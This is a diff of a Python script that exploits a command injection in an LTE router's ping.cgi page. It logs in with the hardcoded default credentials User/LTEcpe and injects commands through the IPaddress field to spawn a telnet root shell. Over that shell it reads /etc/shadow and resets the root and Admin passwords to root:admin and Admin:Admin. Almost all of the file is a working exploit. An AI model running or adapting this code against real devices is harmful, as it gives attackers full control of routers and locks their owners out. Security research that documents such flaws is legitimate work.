@@ -28,83 +28,184 @@
 ########################################################################################################
 
 import requests
+import telnetlib
+import time
 import re
 import base64
 
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-base = 'https://192.168.1.1/'
-login = 'login.cgi'
-index = 'indexMain.cgi'
-ping = 'ping.cgi'
+VERBOSE = False
 
-user = 'User'
-passwd = 'LTEcpe'
+PROMPT   = '# '
+ePROMPT  = PROMPT.encode('ascii')
+
+HOST     = '192.168.1.1'
+base     = 'https://{}/'.format(HOST)
+login    = 'login.cgi'
+index    = 'indexMain.cgi'
+ping     = 'ping.cgi'
+
+user     = 'User'
+password = 'LTEcpe'
+
+# Stage 1 payload: gaining access
+s1_payloads = [
+    '0.0.0.0 ;pkill telnetd #',
+    '0.0.0.0 ;telnetd -l/bin/sh #',
+    '0.0.0.0 ;ps l|grep telnetd #'
+]
+
+###################################
+# Payload examples:
+#
+# '0.0.0.0 ;ps l #'
+# '0.0.0.0 ;ps l|grep telnetd #'
+# '0.0.0.0 ;pkill telnetd #'
+# '0.0.0.0 ;telnetd -l/bin/sh #'
+#
+###################################
+
+# Stage 2 payloads: maintaining access
+s2_payloads = [
+    #'cp /tmp/shadow /etc/shadow',
+    'false | cp -i /etc/shadow /tmp/shadow 2>/dev/null',
+    'cat /etc/shadow',
+    [
+        'chpasswd',
+        'root:admin',
+        ''
+    ],
+    [
+        'chpasswd',
+        'Admin:Admin',
+        ''
+    ],
+    'cat /etc/shadow',
+    'exit'
+]
 
 
 session = requests.session()
-authToken = None
 
 
 def get_token(page):
+
     res = session.get(base + page, verify=False)
     matches = re.findall('<input type="hidden" id="authToken" name="authToken" value="(.{64})"/>', res.text)
     return matches[0]
 
 
-def test_login():
+def exec_telnet(tn, line, till=PROMPT):
 
-    #print('sending login data..')
-    encode_passwd = base64.b64encode(passwd.encode('utf-8'))
+    line = line + '\n'
+    tn.write(line.encode('ascii'))
+    data = b'' 
+    while data.decode('ascii').find(till) == -1:
+        try:
+            data += tn.read_very_eager()
+        except EOFError as e:
+            print('Connection closed: %s' % e)
+            break
+    if data != b'':
+        if VERBOSE:
+            print(data.decode('ascii'))
+
+
+def exec_login():
+
+    print('Logging in..')
+
+    authToken = get_token(login)
+
+    salt_password = base64.b64encode(password.encode('utf-8'))
     salt = authToken
-    salt_passwd = salt + encode_passwd.decode('utf-8')
-    encrypt_passwd = base64.b64encode(salt_passwd.encode('utf-8'))
+    salt_password = salt + salt_password.decode('utf-8')
+    encrypt_password = base64.b64encode(salt_password.encode('utf-8'))
 
     # logining in
     data = dict({
         'authToken': authToken,
         'UserName': 'User',
-        'password': encrypt_passwd,
-        'hiddenPassword': encrypt_passwd,
+        'password': encrypt_password,
+        'hiddenPassword': encrypt_password,
         'submitValue': '1'
     })
     res = session.post(base + login, data=data, verify=False)
-    #print(res.text)
 
     # redirecting
     data = dict({
         'submitValue': '0'
     })
     res = session.post(base + index, data=data, verify=False)
-    #print(res.text)
+
+    print('Logged in!')
 
 
-def test_ping(method, ip):
+def exec_s1_payloads():
 
-    token = get_token(ping)
+    print('Gaining access..')
 
-    data = dict({
-        'authToken': token,
-        'ping': method,
-        'IPaddress': ip,
-    })
+    for s1_payload in s1_payloads:
+
+        authToken = get_token(ping)
+
+        data = dict({
+            'authToken': authToken,
+            'ping': '2',
+            'IPaddress': s1_payload,
+        })
     
-    res = session.post(base + ping, data=data, verify=False)
+        res = session.post(base + ping, data=data, verify=False)
+        matches = re.findall('<textarea name="LineInfoDisplay" align="left" cols="100%" rows="15" readonly >([\s\S]*)</textarea>', res.text)
+        if VERBOSE:
+            print('Output:')
+            print('=' * 20)
+            print(matches[0])
+            print('=' * 20)
 
-    matches = re.findall('<textarea name="LineInfoDisplay" align="left" cols="100%" rows="15" readonly >([\s\S]*)</textarea>', res.text)
+    print('Reverse shell opened!')
 
-    print(matches[0])
+
+def exec_s2_payloads():
+
+    print('Opening a telnet shell..')
+
+    tn = telnetlib.Telnet(HOST)
+    try:
+        res = tn.read_until(ePROMPT, timeout=5)
+    except EOFError as e:
+        print('Connection closed: %s' % e)
+    if res == ePROMPT:
+        print('Connected to reverse shell!')
+        print('Executing payloads..')
+        for s2_payload in s2_payloads:
+            if isinstance(s2_payload, list):
+                if len(s2_payload) < 2:
+                    print('Error in promted cmd!')
+                    break
+                list(map(lambda line: exec_telnet(tn, line, ''), s2_payload[:-1]))
+                exec_telnet(tn, s2_payload[-1])
+            else:
+                exec_telnet(tn, s2_payload)
+
+        print('Done executing payloads!')
+        print('New Credentials:')
+        print('root:admin')
+        print('Admin:Admin')
 
 
 def main():
 
-    global authToken
+    print('Preparing payload execution env..')
 
-    authToken = get_token(login)
+    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+    
+    exec_login()
+    exec_s1_payloads()
+    exec_s2_payloads()
 
-    if authToken is not None:
-        test_login()
-        #test_ping('2', '0.0.0.0 ;cat /etc/sh* #')
-        test_ping('2', '0.0.0.0 ;telnetd -l/bin/sh #')
+    print('Done!')
 
-if __name__ == "__main__":
+if __name__ == '__main__':
     main()
